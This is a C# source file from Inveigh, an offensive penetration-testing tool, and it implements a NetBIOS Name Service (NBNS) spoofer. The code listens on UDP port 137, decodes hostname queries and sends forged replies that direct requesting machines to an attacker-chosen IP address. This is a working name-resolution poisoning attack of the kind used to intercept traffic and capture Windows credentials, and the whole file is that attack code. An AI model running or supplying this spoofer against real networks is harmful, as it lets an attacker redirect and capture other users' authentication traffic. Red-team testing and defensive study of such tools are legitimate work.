using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class NBNS
    {

        public static void NBNSListener(string IP, string spooferIP, string nbnsTTL, string[] nbnsTypes)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
            Array.Reverse(ttlNBNS);
            IPEndPoint nbnsEndpoint = new IPEndPoint(IPAddress.Broadcast, 137);
            UdpClient nbnsClient;

            try
            {
                nbnsClient = new UdpClient(137);
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting unprivileged NBNS spoofer, UDP port sharing does not work on all versions of Windows.", DateTime.Now.ToString("s")));
                }

                throw;
            }

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = nbnsClient.Receive(ref nbnsEndpoint);
                    byte[] nbnsQuestionsAnswerRRs = new byte[4];
                    System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
                    byte[] nbnsAdditionalRRs = new byte[2];
                    System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);

                    if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
                    {
                        string nbnsResponseMessage = "";
                        byte[] nbnsTransactionID = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
                        byte[] nbnsRequestType = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
                        string nbnsQueryType = NBNSQueryType(nbnsRequestType);
                        byte[] nbnsRequest = new byte[udpPayload.Length - 20];
                        System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
                        string nbnsRequestHost = BytesToNBNSQuery(nbnsRequest);
                        IPAddress sourceIPAddress = nbnsEndpoint.Address;
                        nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), IP.ToString(), "NBNS");

                        if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
                        {

                            if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
                            {
                                using (MemoryStream ms = new MemoryStream())
                                {
                                    ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
                                    ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
                                    ms.Write(nbnsRequest, 0, nbnsRequest.Length);
                                    ms.Write(nbnsRequestType, 0, 2);
                                    ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
                                    ms.Write(ttlNBNS, 0, 4);
                                    ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
                                    IPEndPoint nbnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, 137);
                                    nbnsClient.Connect(nbnsDestinationEndPoint);
                                    nbnsClient.Send(ms.ToArray(), ms.ToArray().Length);
                                    nbnsClient.Close();
                                    nbnsClient = new UdpClient(137);
                                }

                            }
                            else
                            {
                                nbnsResponseMessage = "NBNS type disabled";
                            }

                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                        }


                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] NBNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static string BytesToNBNSQuery(byte[] field)
        {
            string nbnsUTF8 = BitConverter.ToString(field);
            nbnsUTF8 = nbnsUTF8.Replace("-00", String.Empty);
            string[] nbnsArray = nbnsUTF8.Split('-');
            string nbnsQuery = "";

            foreach (string character in nbnsArray)
            {
                nbnsQuery += new System.String(Convert.ToChar(Convert.ToInt16(character, 16)), 1);
            }

            if (nbnsQuery.Contains("CA"))
            {
                nbnsQuery = nbnsQuery.Substring(0, nbnsQuery.IndexOf("CA"));
            }

            int i = 0;
            string nbnsQuerySubtracted = "";

            do
            {
                byte nbnsQuerySub = (byte)Convert.ToChar(nbnsQuery.Substring(i, 1));
                nbnsQuerySub -= 65;
                nbnsQuerySubtracted += Convert.ToString(nbnsQuerySub, 16);
                i++;
            }
            while (i < nbnsQuery.Length);

            i = 0;
            string nbnsQueryHost = "";

            do
            {
                nbnsQueryHost += (Convert.ToChar(Convert.ToInt16(nbnsQuerySubtracted.Substring(i, 2), 16)));
                i += 2;
            }
            while (i < nbnsQuerySubtracted.Length - 1);

            return nbnsQueryHost;
        }

        public static string NBNSQueryType(byte[] field)
        {
            string nbnsQuery1 = BitConverter.ToString(field);
            string nbnsQueryType = "";

            switch (nbnsQuery1)
            {
                case "41-41":
                    nbnsQueryType = "00";
                    break;

                case "41-44":
                    nbnsQueryType = "03";
                    break;

                case "43-41":
                    nbnsQueryType = "20";
                    break;

                case "42-4C":
                    nbnsQueryType = "1B";
                    break;

                case "42-4D":
                    nbnsQueryType = "1C";
                    break;

                case "42-4E":
                    nbnsQueryType = "1D";
                    break;

                case "42-4F":
                    nbnsQueryType = "1E";
                    break;

            }

            return nbnsQueryType;
        }

    }
}
